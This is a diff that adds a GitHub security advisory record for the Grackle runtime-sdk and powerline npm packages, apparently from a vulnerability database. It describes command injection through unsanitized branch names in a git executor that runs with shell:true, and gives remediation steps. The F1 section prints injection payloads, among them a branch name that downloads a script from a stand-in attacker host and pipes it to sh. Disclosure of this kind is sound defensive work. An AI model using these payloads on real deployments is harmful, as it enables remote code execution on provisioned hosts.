@@ -1,0 +1,452 @@
+advisory_id: GHSA-vv65-f55v-xm6g
+datasource_id: github_osv/GHSA-vv65-f55v-xm6g
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-vv65-f55v-xm6g/GHSA-vv65-f55v-xm6g.json
+aliases: []
+summary: |
+  Grackle has command/argument injection in the git worktree executor that enables RCE on provisioned hosts via an unsanitized task branch name (shell:true)
+  ## Summary
+
+  The default git executor used for all worktree operations spawns `git` through a shell, and the untrusted task **branch** name flows into the command unsanitized. A caller able to reach the PowerLine `SpawnSession` RPC (a malicious or compromised agent acting through the orchestration layer, or any client able to spawn a task) can achieve **arbitrary command execution** as the PowerLine user on every provisioned environment (SSH host, Docker container, or Codespace), escaping the agent sandbox.
+
+  This advisory bundles two related defects in `worktree.ts` (audit findings **F1** and **F13**).
+
+  ## Affected versions
+
+  `@grackle-ai/runtime-sdk` (and reachable via `@grackle-ai/powerline`) at version **0.132.1** and earlier. All publishable packages are lockstep-versioned.
+
+  ## F1 — Command injection via `shell:true` (primary, High)
+
+  **Location:** `packages/runtime-sdk/src/worktree.ts:22-28` (sink), `:135-143` (branch → args). Source: `packages/powerline/src/grpc-server.ts:112` (`req.branch`), `packages/runtime-sdk/src/base-session.ts:60,137`.
+
+  `NODE_GIT_EXECUTOR.exec` runs:
+
+  ```ts
+  const shell = process.env.SHELL || true;   // worktree.ts:24 — always truthy
+  const result = await execRaw("git", args, { ...options, shell });
+  ```
+
+  When `shell` is truthy, Node does **not** pass `args` as a safe argv vector — it concatenates `git` + args into a single string run through `sh -c` with **no escaping**. The untrusted `branch` flows unvalidated from the `SpawnSession` gRPC request into:
+
+  ```ts
+  ["worktree", "add", "-b", branch, wtPath, startPoint]   // worktree.ts:135-137
+  ["worktree", "add", wtPath, branch]                     // fallback :143
+  ```
+
+  `sanitizeBranch()` (`worktree.ts:50`) is applied **only** to compute the on-disk worktree directory path — *not* to the `-b <branch>` argument — so it provides zero protection at the injection sink.
+
+  **Exploit:** set a task branch to `x;curl http://attacker/x.sh|sh;#` or `$(touch /tmp/pwned)`. `ensureWorktree` runs it under `sh -c`, yielding RCE as the PowerLine user. (Empirically confirmed during the audit: an args-array branch value `evilbranch;touch /tmp/PWNED` created the file.)
+
+  The sibling git path in `runtime-utils.ts:48-56` already uses `execFileAsync("git", [...])` with **no** shell, confirming `shell:true` is unnecessary here.
+
+  ## F13 — Argument injection: missing `--` separator (residual, Low)
+
+  **Location:** `packages/runtime-sdk/src/worktree.ts:135-143`.
+
+  Independent of the shell issue, `branch` is placed as a positional argument with no `--` terminator. The sibling `checkoutBranch` (`runtime-utils.ts:51`) correctly uses `["checkout", "--", branch]`. Only the fallback invocation (bare trailing positional) is genuinely flag-injectable; `git worktree add` exposes no dangerous flags reachable this way, so standalone impact is limited — but it should be hardened alongside F1.
+
+  ## Remediation
+
+  1. **Remove `shell` from `NODE_GIT_EXECUTOR`** — `execFile('git', args)` with the argv array is already safe and is the pattern used in `runtime-utils.ts`. This is the primary fix.
+  2. Add a `--` separator before positional refs/paths in both `worktree add` invocations.
+  3. **Defense in depth:** validate `branch` at the gRPC boundary (`grpc-server.ts`) against git ref rules — reject names beginning with `-`, containing `..`, or containing shell metacharacters — before it reaches `ensureWorktree`.
+impacted_packages:
+  - purl: pkg:npm/%40grackle-ai/runtime-sdk
+    affected_versions: vers:npm/<=0.132.1
+    fixed_versions:
+    affected_packages:
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.82.2
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.83.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.83.1
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.83.2
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.84.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.84.1
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.85.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.85.1
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.85.2
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.86.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.86.1
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.87.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.88.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.89.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.89.1
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.89.2
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.89.3
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.89.4
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.90.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.91.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.91.1
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.91.2
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.91.3
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.91.4
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.92.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.92.1
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.92.2
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.92.3
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.93.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.94.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.95.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.95.1
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.95.2
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.96.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.96.1
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.96.2
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.96.3
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.98.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.99.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.100.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.100.1
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.101.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.102.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.103.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.104.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.105.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.106.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.106.1
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.106.2
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.106.3
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.107.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.107.1
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.107.2
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.108.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.108.1
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.108.2
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.108.3
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.108.4
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.110.1
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.110.2
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.110.3
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.111.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.112.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.112.1
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.112.2
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.113.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.114.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.115.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.115.1
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.115.2
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.116.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.117.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.118.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.119.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.120.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.121.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.122.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.123.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.123.1
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.123.2
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.124.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.125.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.125.1
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.125.2
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.126.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.126.1
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.127.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.128.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.129.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.130.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.131.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.132.0
+      - pkg:npm/%40grackle-ai/runtime-sdk@0.132.1
+    fixed_packages: []
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/%40grackle-ai/powerline
+    affected_versions: vers:npm/<=0.132.1
+    fixed_versions:
+    affected_packages:
+      - pkg:npm/%40grackle-ai/powerline@0.0.2
+      - pkg:npm/%40grackle-ai/powerline@0.0.3
+      - pkg:npm/%40grackle-ai/powerline@0.0.4
+      - pkg:npm/%40grackle-ai/powerline@0.0.5
+      - pkg:npm/%40grackle-ai/powerline@0.0.6
+      - pkg:npm/%40grackle-ai/powerline@0.1.0
+      - pkg:npm/%40grackle-ai/powerline@0.2.0
+      - pkg:npm/%40grackle-ai/powerline@0.3.0
+      - pkg:npm/%40grackle-ai/powerline@0.4.0
+      - pkg:npm/%40grackle-ai/powerline@0.5.0
+      - pkg:npm/%40grackle-ai/powerline@0.6.0
+      - pkg:npm/%40grackle-ai/powerline@0.7.0
+      - pkg:npm/%40grackle-ai/powerline@0.8.0
+      - pkg:npm/%40grackle-ai/powerline@0.9.0
+      - pkg:npm/%40grackle-ai/powerline@0.10.0
+      - pkg:npm/%40grackle-ai/powerline@0.11.0
+      - pkg:npm/%40grackle-ai/powerline@0.11.1
+      - pkg:npm/%40grackle-ai/powerline@0.11.2
+      - pkg:npm/%40grackle-ai/powerline@0.12.0
+      - pkg:npm/%40grackle-ai/powerline@0.13.0
+      - pkg:npm/%40grackle-ai/powerline@0.14.1
+      - pkg:npm/%40grackle-ai/powerline@0.14.2
+      - pkg:npm/%40grackle-ai/powerline@0.14.3
+      - pkg:npm/%40grackle-ai/powerline@0.14.4
+      - pkg:npm/%40grackle-ai/powerline@0.14.5
+      - pkg:npm/%40grackle-ai/powerline@0.14.6
+      - pkg:npm/%40grackle-ai/powerline@0.14.7
+      - pkg:npm/%40grackle-ai/powerline@0.14.8
+      - pkg:npm/%40grackle-ai/powerline@0.14.9
+      - pkg:npm/%40grackle-ai/powerline@0.14.10
+      - pkg:npm/%40grackle-ai/powerline@0.15.0
+      - pkg:npm/%40grackle-ai/powerline@0.15.1
+      - pkg:npm/%40grackle-ai/powerline@0.16.0
+      - pkg:npm/%40grackle-ai/powerline@0.17.0
+      - pkg:npm/%40grackle-ai/powerline@0.17.1
+      - pkg:npm/%40grackle-ai/powerline@0.18.0
+      - pkg:npm/%40grackle-ai/powerline@0.18.1
+      - pkg:npm/%40grackle-ai/powerline@0.18.2
+      - pkg:npm/%40grackle-ai/powerline@0.18.3
+      - pkg:npm/%40grackle-ai/powerline@0.19.0
+      - pkg:npm/%40grackle-ai/powerline@0.20.0
+      - pkg:npm/%40grackle-ai/powerline@0.21.0
+      - pkg:npm/%40grackle-ai/powerline@0.22.0
+      - pkg:npm/%40grackle-ai/powerline@0.23.0
+      - pkg:npm/%40grackle-ai/powerline@0.24.0
+      - pkg:npm/%40grackle-ai/powerline@0.24.1
+      - pkg:npm/%40grackle-ai/powerline@0.25.0
+      - pkg:npm/%40grackle-ai/powerline@0.26.0
+      - pkg:npm/%40grackle-ai/powerline@0.27.0
+      - pkg:npm/%40grackle-ai/powerline@0.28.0
+      - pkg:npm/%40grackle-ai/powerline@0.29.0
+      - pkg:npm/%40grackle-ai/powerline@0.29.1
+      - pkg:npm/%40grackle-ai/powerline@0.30.0
+      - pkg:npm/%40grackle-ai/powerline@0.31.0
+      - pkg:npm/%40grackle-ai/powerline@0.31.1
+      - pkg:npm/%40grackle-ai/powerline@0.31.2
+      - pkg:npm/%40grackle-ai/powerline@0.32.0
+      - pkg:npm/%40grackle-ai/powerline@0.33.0
+      - pkg:npm/%40grackle-ai/powerline@0.34.0
+      - pkg:npm/%40grackle-ai/powerline@0.34.1
+      - pkg:npm/%40grackle-ai/powerline@0.35.0
+      - pkg:npm/%40grackle-ai/powerline@0.35.1
+      - pkg:npm/%40grackle-ai/powerline@0.36.0
+      - pkg:npm/%40grackle-ai/powerline@0.37.0
+      - pkg:npm/%40grackle-ai/powerline@0.38.0
+      - pkg:npm/%40grackle-ai/powerline@0.38.1
+      - pkg:npm/%40grackle-ai/powerline@0.38.2
+      - pkg:npm/%40grackle-ai/powerline@0.39.0
+      - pkg:npm/%40grackle-ai/powerline@0.39.1
+      - pkg:npm/%40grackle-ai/powerline@0.40.0
+      - pkg:npm/%40grackle-ai/powerline@0.41.0
+      - pkg:npm/%40grackle-ai/powerline@0.41.1
+      - pkg:npm/%40grackle-ai/powerline@0.42.0
+      - pkg:npm/%40grackle-ai/powerline@0.43.0
+      - pkg:npm/%40grackle-ai/powerline@0.44.0
+      - pkg:npm/%40grackle-ai/powerline@0.45.0
+      - pkg:npm/%40grackle-ai/powerline@0.45.1
+      - pkg:npm/%40grackle-ai/powerline@0.46.0
+      - pkg:npm/%40grackle-ai/powerline@0.47.0
+      - pkg:npm/%40grackle-ai/powerline@0.47.1
+      - pkg:npm/%40grackle-ai/powerline@0.48.0
+      - pkg:npm/%40grackle-ai/powerline@0.49.0
+      - pkg:npm/%40grackle-ai/powerline@0.50.0
+      - pkg:npm/%40grackle-ai/powerline@0.50.1
+      - pkg:npm/%40grackle-ai/powerline@0.51.0
+      - pkg:npm/%40grackle-ai/powerline@0.52.0
+      - pkg:npm/%40grackle-ai/powerline@0.52.1
+      - pkg:npm/%40grackle-ai/powerline@0.52.2
+      - pkg:npm/%40grackle-ai/powerline@0.52.3
+      - pkg:npm/%40grackle-ai/powerline@0.52.4
+      - pkg:npm/%40grackle-ai/powerline@0.53.0
+      - pkg:npm/%40grackle-ai/powerline@0.53.1
+      - pkg:npm/%40grackle-ai/powerline@0.53.2
+      - pkg:npm/%40grackle-ai/powerline@0.53.3
+      - pkg:npm/%40grackle-ai/powerline@0.53.4
+      - pkg:npm/%40grackle-ai/powerline@0.53.5
+      - pkg:npm/%40grackle-ai/powerline@0.54.0
+      - pkg:npm/%40grackle-ai/powerline@0.54.1
+      - pkg:npm/%40grackle-ai/powerline@0.55.0
+      - pkg:npm/%40grackle-ai/powerline@0.56.0
+      - pkg:npm/%40grackle-ai/powerline@0.56.1
+      - pkg:npm/%40grackle-ai/powerline@0.56.2
+      - pkg:npm/%40grackle-ai/powerline@0.56.3
+      - pkg:npm/%40grackle-ai/powerline@0.57.0
+      - pkg:npm/%40grackle-ai/powerline@0.57.1
+      - pkg:npm/%40grackle-ai/powerline@0.58.0
+      - pkg:npm/%40grackle-ai/powerline@0.59.0
+      - pkg:npm/%40grackle-ai/powerline@0.59.1
+      - pkg:npm/%40grackle-ai/powerline@0.60.0
+      - pkg:npm/%40grackle-ai/powerline@0.61.0
+      - pkg:npm/%40grackle-ai/powerline@0.61.1
+      - pkg:npm/%40grackle-ai/powerline@0.61.2
+      - pkg:npm/%40grackle-ai/powerline@0.61.3
+      - pkg:npm/%40grackle-ai/powerline@0.62.0
+      - pkg:npm/%40grackle-ai/powerline@0.62.1
+      - pkg:npm/%40grackle-ai/powerline@0.62.2
+      - pkg:npm/%40grackle-ai/powerline@0.63.0
+      - pkg:npm/%40grackle-ai/powerline@0.64.0
+      - pkg:npm/%40grackle-ai/powerline@0.64.1
+      - pkg:npm/%40grackle-ai/powerline@0.64.2
+      - pkg:npm/%40grackle-ai/powerline@0.65.0
+      - pkg:npm/%40grackle-ai/powerline@0.66.0
+      - pkg:npm/%40grackle-ai/powerline@0.67.0
+      - pkg:npm/%40grackle-ai/powerline@0.68.0
+      - pkg:npm/%40grackle-ai/powerline@0.68.1
+      - pkg:npm/%40grackle-ai/powerline@0.68.2
+      - pkg:npm/%40grackle-ai/powerline@0.68.3
+      - pkg:npm/%40grackle-ai/powerline@0.69.0
+      - pkg:npm/%40grackle-ai/powerline@0.69.1
+      - pkg:npm/%40grackle-ai/powerline@0.70.0
+      - pkg:npm/%40grackle-ai/powerline@0.70.1
+      - pkg:npm/%40grackle-ai/powerline@0.70.2
+      - pkg:npm/%40grackle-ai/powerline@0.70.3
+      - pkg:npm/%40grackle-ai/powerline@0.70.4
+      - pkg:npm/%40grackle-ai/powerline@0.70.5
+      - pkg:npm/%40grackle-ai/powerline@0.70.6
+      - pkg:npm/%40grackle-ai/powerline@0.71.0
+      - pkg:npm/%40grackle-ai/powerline@0.71.1
+      - pkg:npm/%40grackle-ai/powerline@0.71.2
+      - pkg:npm/%40grackle-ai/powerline@0.71.3
+      - pkg:npm/%40grackle-ai/powerline@0.72.0
+      - pkg:npm/%40grackle-ai/powerline@0.72.1
+      - pkg:npm/%40grackle-ai/powerline@0.72.2
+      - pkg:npm/%40grackle-ai/powerline@0.72.3
+      - pkg:npm/%40grackle-ai/powerline@0.72.4
+      - pkg:npm/%40grackle-ai/powerline@0.72.5
+      - pkg:npm/%40grackle-ai/powerline@0.72.6
+      - pkg:npm/%40grackle-ai/powerline@0.73.0
+      - pkg:npm/%40grackle-ai/powerline@0.73.1
+      - pkg:npm/%40grackle-ai/powerline@0.74.0
+      - pkg:npm/%40grackle-ai/powerline@0.74.1
+      - pkg:npm/%40grackle-ai/powerline@0.75.0
+      - pkg:npm/%40grackle-ai/powerline@0.75.1
+      - pkg:npm/%40grackle-ai/powerline@0.75.2
+      - pkg:npm/%40grackle-ai/powerline@0.75.3
+      - pkg:npm/%40grackle-ai/powerline@0.75.4
+      - pkg:npm/%40grackle-ai/powerline@0.75.5
+      - pkg:npm/%40grackle-ai/powerline@0.75.6
+      - pkg:npm/%40grackle-ai/powerline@0.75.7
+      - pkg:npm/%40grackle-ai/powerline@0.75.8
+      - pkg:npm/%40grackle-ai/powerline@0.75.9
+      - pkg:npm/%40grackle-ai/powerline@0.75.10
+      - pkg:npm/%40grackle-ai/powerline@0.75.11
+      - pkg:npm/%40grackle-ai/powerline@0.75.12
+      - pkg:npm/%40grackle-ai/powerline@0.75.13
+      - pkg:npm/%40grackle-ai/powerline@0.76.0
+      - pkg:npm/%40grackle-ai/powerline@0.76.1
+      - pkg:npm/%40grackle-ai/powerline@0.76.2
+      - pkg:npm/%40grackle-ai/powerline@0.76.3
+      - pkg:npm/%40grackle-ai/powerline@0.77.0
+      - pkg:npm/%40grackle-ai/powerline@0.78.0
+      - pkg:npm/%40grackle-ai/powerline@0.79.0
+      - pkg:npm/%40grackle-ai/powerline@0.79.1
+      - pkg:npm/%40grackle-ai/powerline@0.80.0
+      - pkg:npm/%40grackle-ai/powerline@0.81.0
+      - pkg:npm/%40grackle-ai/powerline@0.82.0
+      - pkg:npm/%40grackle-ai/powerline@0.82.1
+      - pkg:npm/%40grackle-ai/powerline@0.82.2
+      - pkg:npm/%40grackle-ai/powerline@0.83.0
+      - pkg:npm/%40grackle-ai/powerline@0.83.1
+      - pkg:npm/%40grackle-ai/powerline@0.83.2
+      - pkg:npm/%40grackle-ai/powerline@0.84.0
+      - pkg:npm/%40grackle-ai/powerline@0.84.1
+      - pkg:npm/%40grackle-ai/powerline@0.85.0
+      - pkg:npm/%40grackle-ai/powerline@0.85.1
+      - pkg:npm/%40grackle-ai/powerline@0.85.2
+      - pkg:npm/%40grackle-ai/powerline@0.86.0
+      - pkg:npm/%40grackle-ai/powerline@0.86.1
+      - pkg:npm/%40grackle-ai/powerline@0.87.0
+      - pkg:npm/%40grackle-ai/powerline@0.88.0
+      - pkg:npm/%40grackle-ai/powerline@0.89.0
+      - pkg:npm/%40grackle-ai/powerline@0.89.1
+      - pkg:npm/%40grackle-ai/powerline@0.89.2
+      - pkg:npm/%40grackle-ai/powerline@0.89.3
+      - pkg:npm/%40grackle-ai/powerline@0.89.4
+      - pkg:npm/%40grackle-ai/powerline@0.90.0
+      - pkg:npm/%40grackle-ai/powerline@0.91.0
+      - pkg:npm/%40grackle-ai/powerline@0.91.1
+      - pkg:npm/%40grackle-ai/powerline@0.91.2
+      - pkg:npm/%40grackle-ai/powerline@0.91.3
+      - pkg:npm/%40grackle-ai/powerline@0.91.4
+      - pkg:npm/%40grackle-ai/powerline@0.92.0
+      - pkg:npm/%40grackle-ai/powerline@0.92.1
+      - pkg:npm/%40grackle-ai/powerline@0.92.2
+      - pkg:npm/%40grackle-ai/powerline@0.92.3
+      - pkg:npm/%40grackle-ai/powerline@0.93.0
+      - pkg:npm/%40grackle-ai/powerline@0.94.0
+      - pkg:npm/%40grackle-ai/powerline@0.95.0
+      - pkg:npm/%40grackle-ai/powerline@0.95.1
+      - pkg:npm/%40grackle-ai/powerline@0.95.2
+      - pkg:npm/%40grackle-ai/powerline@0.96.0
+      - pkg:npm/%40grackle-ai/powerline@0.96.1
+      - pkg:npm/%40grackle-ai/powerline@0.96.2
+      - pkg:npm/%40grackle-ai/powerline@0.96.3
+      - pkg:npm/%40grackle-ai/powerline@0.97.0
+      - pkg:npm/%40grackle-ai/powerline@0.98.0
+      - pkg:npm/%40grackle-ai/powerline@0.99.0
+      - pkg:npm/%40grackle-ai/powerline@0.100.0
+      - pkg:npm/%40grackle-ai/powerline@0.100.1
+      - pkg:npm/%40grackle-ai/powerline@0.101.0
+      - pkg:npm/%40grackle-ai/powerline@0.102.0
+      - pkg:npm/%40grackle-ai/powerline@0.103.0
+      - pkg:npm/%40grackle-ai/powerline@0.104.0
+      - pkg:npm/%40grackle-ai/powerline@0.105.0
+      - pkg:npm/%40grackle-ai/powerline@0.106.0
+      - pkg:npm/%40grackle-ai/powerline@0.106.1
+      - pkg:npm/%40grackle-ai/powerline@0.106.2
+      - pkg:npm/%40grackle-ai/powerline@0.106.3
+      - pkg:npm/%40grackle-ai/powerline@0.107.0
+      - pkg:npm/%40grackle-ai/powerline@0.107.1
+      - pkg:npm/%40grackle-ai/powerline@0.107.2
+      - pkg:npm/%40grackle-ai/powerline@0.108.0
+      - pkg:npm/%40grackle-ai/powerline@0.108.1
+      - pkg:npm/%40grackle-ai/powerline@0.108.2
+      - pkg:npm/%40grackle-ai/powerline@0.108.3
+      - pkg:npm/%40grackle-ai/powerline@0.108.4
+      - pkg:npm/%40grackle-ai/powerline@0.110.1
+      - pkg:npm/%40grackle-ai/powerline@0.110.2
+      - pkg:npm/%40grackle-ai/powerline@0.110.3
+      - pkg:npm/%40grackle-ai/powerline@0.111.0
+      - pkg:npm/%40grackle-ai/powerline@0.112.0
+      - pkg:npm/%40grackle-ai/powerline@0.112.1
+      - pkg:npm/%40grackle-ai/powerline@0.112.2
+      - pkg:npm/%40grackle-ai/powerline@0.113.0
+      - pkg:npm/%40grackle-ai/powerline@0.114.0
+      - pkg:npm/%40grackle-ai/powerline@0.115.0
+      - pkg:npm/%40grackle-ai/powerline@0.115.1
+      - pkg:npm/%40grackle-ai/powerline@0.115.2
+      - pkg:npm/%40grackle-ai/powerline@0.116.0
+      - pkg:npm/%40grackle-ai/powerline@0.117.0
+      - pkg:npm/%40grackle-ai/powerline@0.118.0
+      - pkg:npm/%40grackle-ai/powerline@0.119.0
+      - pkg:npm/%40grackle-ai/powerline@0.120.0
+      - pkg:npm/%40grackle-ai/powerline@0.121.0
+      - pkg:npm/%40grackle-ai/powerline@0.122.0
+      - pkg:npm/%40grackle-ai/powerline@0.123.0
+      - pkg:npm/%40grackle-ai/powerline@0.123.1
+      - pkg:npm/%40grackle-ai/powerline@0.123.2
+      - pkg:npm/%40grackle-ai/powerline@0.124.0
+      - pkg:npm/%40grackle-ai/powerline@0.125.0
+      - pkg:npm/%40grackle-ai/powerline@0.125.1
+      - pkg:npm/%40grackle-ai/powerline@0.125.2
+      - pkg:npm/%40grackle-ai/powerline@0.126.0
+      - pkg:npm/%40grackle-ai/powerline@0.126.1
+      - pkg:npm/%40grackle-ai/powerline@0.127.0
+      - pkg:npm/%40grackle-ai/powerline@0.128.0
+      - pkg:npm/%40grackle-ai/powerline@0.129.0
+      - pkg:npm/%40grackle-ai/powerline@0.130.0
+      - pkg:npm/%40grackle-ai/powerline@0.131.0
+      - pkg:npm/%40grackle-ai/powerline@0.132.0
+      - pkg:npm/%40grackle-ai/powerline@0.132.1
+    fixed_packages: []
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '8.7'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-vv65-f55v-xm6g/GHSA-vv65-f55v-xm6g.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-78
+  - CWE-88
+references:
+  - url: https://github.com/nick-pape/grackle
+    reference_type:
+    reference_id:
+  - url: https://github.com/nick-pape/grackle/security/advisories/GHSA-vv65-f55v-xm6g
+    reference_type:
+    reference_id:
+exploits: []
